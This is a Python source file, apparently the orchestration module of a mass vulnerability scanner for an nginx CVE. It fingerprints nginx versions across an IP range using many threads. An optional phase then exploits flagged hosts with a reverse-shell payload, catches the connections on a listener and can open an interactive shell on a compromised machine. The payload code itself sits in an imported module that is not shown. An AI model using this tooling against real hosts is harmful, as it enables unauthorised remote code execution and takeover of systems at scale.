"""Scan orchestration: passive fingerprint + optional exploit validation."""

from __future__ import annotations

import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

from scanner.constants import STATUS_MARKS
from scanner.exploit import (
    ShellCatcher,
    build_reverse_shell_cmd,
    format_scan_command,
    interactive_shell,
    validate_with_reverse_shell,
)
from scanner.http import build_requests, http_probe, probe_to_dict
from scanner.models import (
    STATUSES_ELIGIBLE_FOR_EXPLOIT,
    VULNERABLE_STATUSES,
    HostScanResult,
    ProbeResult,
    ScanConfig,
    VulnStatus,
)
from scanner.targets import expand_targets, parse_ip_range
from scanner.version import classify_vulnerability, classification_to_dict


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class Scanner:
    def __init__(self, config: ScanConfig) -> None:
        self.config = config
        self.addresses = parse_ip_range(config.ip_range)
        self.targets = expand_targets(self.addresses, config.ports)
        self.results: list[HostScanResult] = []
        self._results_lock = threading.Lock()
        self._print_lock = threading.Lock()
        self.started_at = utc_now_iso()

    def run(self) -> list[HostScanResult]:
        if not self.targets:
            raise ValueError("IP range produced no targets")

        self._log(
            f"[*] Range {self.config.ip_range!r} -> {len(self.addresses)} IPs, "
            f"{len(self.targets)} host:port pairs, {self.config.threads} threads"
        )
        if self.config.probe_path:
            self._log(f"[*] Config probe path: {self.config.probe_path}")

        self._log("[*] Phase 1: passive fingerprint")
        self._run_passive()

        if self.config.exploit_validate:
            self._run_exploit_validation()

        self.results.sort(key=lambda r: (r.ip, r.port))
        return self.results

    def vulnerable_results(self) -> list[HostScanResult]:
        return [r for r in self.results if r.status in VULNERABLE_STATUSES]

    def result_to_report_row(self, row: HostScanResult) -> dict:
        entry: dict = {
            "ip": row.ip,
            "port": row.port,
            "status": row.status,
        }
        version = row.classification.get("version")
        if version:
            entry["nginx_version"] = version
        if row.exploit.get("success"):
            entry["confirmed"] = True
            peer = row.exploit.get("shell_peer")
            if peer:
                entry["shell_peer"] = peer
        if self.config.shell and row.exploit.get("shell_command"):
            entry["shell_command"] = row.exploit["shell_command"]
        return entry

    def build_report(self) -> dict:
        vuln_rows = self.vulnerable_results()
        return {
            "cve": self.config.cve_id,
            "target": self.config.ip_range,
            "scanned_at": self.started_at,
            "total_vulnerable": len(vuln_rows),
            "vulnerable": [self.result_to_report_row(r) for r in vuln_rows],
        }

    def write_report(self) -> None:
        with open(self.config.output, "w", encoding="utf-8") as fh:
            json.dump(self.build_report(), fh, indent=2)
            fh.write("\n")

    def summarize(self, rows: list[HostScanResult] | None = None) -> dict[str, int]:
        data = rows if rows is not None else self.results
        counts = {s.value: 0 for s in VulnStatus}
        for row in data:
            counts[row.status] = counts.get(row.status, 0) + 1
        counts["total"] = len(data)
        counts["open"] = sum(1 for r in data if r.open)
        return counts

    def scan_host(self, ip: str, port: int) -> HostScanResult:
        scanned_at = utc_now_iso()
        probes: dict[str, ProbeResult] = {}
        latencies: list[float] = []
        reachable = False

        for name, (req, path) in build_requests(ip, self.config.probe_path).items():
            conn_ok, probe, latency = http_probe(
                ip,
                port,
                req,
                path,
                self.config.connect_timeout,
                self.config.read_timeout,
            )
            probes[name] = probe
            if conn_ok:
                reachable = True
            if latency is not None:
                latencies.append(latency)

        try:
            classification = classify_vulnerability(probes, self.config.probe_path)
            status = classification.status.value
            classification_dict = classification_to_dict(classification)
        except Exception as exc:
            return HostScanResult(
                ip=ip,
                port=port,
                status=VulnStatus.ERROR.value,
                open=reachable,
                latency_ms=min(latencies) if latencies else None,
                probes={k: probe_to_dict(v) for k, v in probes.items()},
                classification={"error": str(exc)},
                error=str(exc),
                scanned_at=scanned_at,
            )

        return HostScanResult(
            ip=ip,
            port=port,
            status=status,
            open=reachable,
            latency_ms=round(min(latencies), 2) if latencies else None,
            probes={k: probe_to_dict(v) for k, v in probes.items()},
            classification=classification_dict,
            scanned_at=scanned_at,
        )

    def _run_passive(self) -> None:
        def worker(ip: str, port: int) -> HostScanResult:
            row = self.scan_host(ip, port)
            if not self.config.quiet:
                ver = row.classification.get("version") or "-"
                mark = STATUS_MARKS.get(row.status, "[ ]")
                self._log(f"{mark} {ip}:{port} -> {row.status} (nginx {ver})")
            with self._results_lock:
                self.results.append(row)
            return row

        with ThreadPoolExecutor(max_workers=self.config.threads) as pool:
            futures = [pool.submit(worker, ip, port) for ip, port in self.targets]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as exc:
                    self._log(f"[!] worker error: {exc}", is_error=True)

    def _run_exploit_validation(self) -> None:
        bind_host = "0.0.0.0"
        catcher = ShellCatcher(bind_host, self.config.listen_port)
        try:
            catcher.start()
        except OSError as exc:
            raise OSError(
                f"cannot bind shell listener on {bind_host}:{self.config.listen_port}: {exc}"
            ) from exc

        self._log(
            f"[*] Phase 2: reverse-shell validation -> "
            f"{self.config.listen_ip}:{self.config.listen_port}"
        )
        if self.config.shell:
            self._log(format_scan_command(
                self.config.ip_range, self.config.listen_ip, self.config.listen_port,
            ))
            self._log(
                f"[*] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}"
            )

        rows = [
            row
            for row in self.results
            if row.open
            and (
                self.config.validate_all_open
                or row.status in STATUSES_ELIGIBLE_FOR_EXPLOIT
            )
        ]

        for row in rows:
            exploit_port = (
                self.config.exploit_port
                if self.config.exploit_port is not None
                else row.port
            )
            if not self.config.quiet:
                self._log(f"[*] Exploit {row.ip}:{exploit_port} (scan port {row.port})...")

            meta = validate_with_reverse_shell(
                row.ip,
                exploit_port,
                self.config.listen_ip,
                self.config.listen_port,
                catcher,
                self.config.exploit_tries,
                self.config.exploit_max_offsets,
                self.config.shell_wait,
            )
            row.exploit = meta
            if meta.get("success"):
                row.status = VulnStatus.CONFIRMED_VULNERABLE.value
                row.classification["exploit_confirmed"] = True
                row.classification["reasons"] = [
                    f"reverse shell from {meta['shell_peer']}",
                    *row.classification.get("reasons", [])[:5],
                ]
                peer = meta.get("shell_peer", "?")
                self._log(f"[+] VULNERABLE {row.ip}:{exploit_port} — shell from {peer}")
                if self.config.shell:
                    self._log(
                        f"[+] {format_scan_command(self.config.ip_range, self.config.listen_ip, self.config.listen_port)}"
                    )
                    self._log(f"[+] Payload: {build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port)}")
                    meta["shell_command"] = build_reverse_shell_cmd(
                        self.config.listen_ip, self.config.listen_port
                    )

                if self.config.interactive_shell:
                    conn = catcher.take_connection()
                    catcher.stop()
                    if conn is not None:
                        interactive_shell(conn, peer)
                    return

            elif not self.config.quiet:
                err = meta.get("error") or "no shell"
                self._log(f"[ ] {row.ip}:{exploit_port} not exploited ({err})")

        catcher.stop()

    def _log(self, message: str, is_error: bool = False) -> None:
        with self._print_lock:
            if is_error:
                import sys
                print(message, file=sys.stderr)
            else:
                print(message)
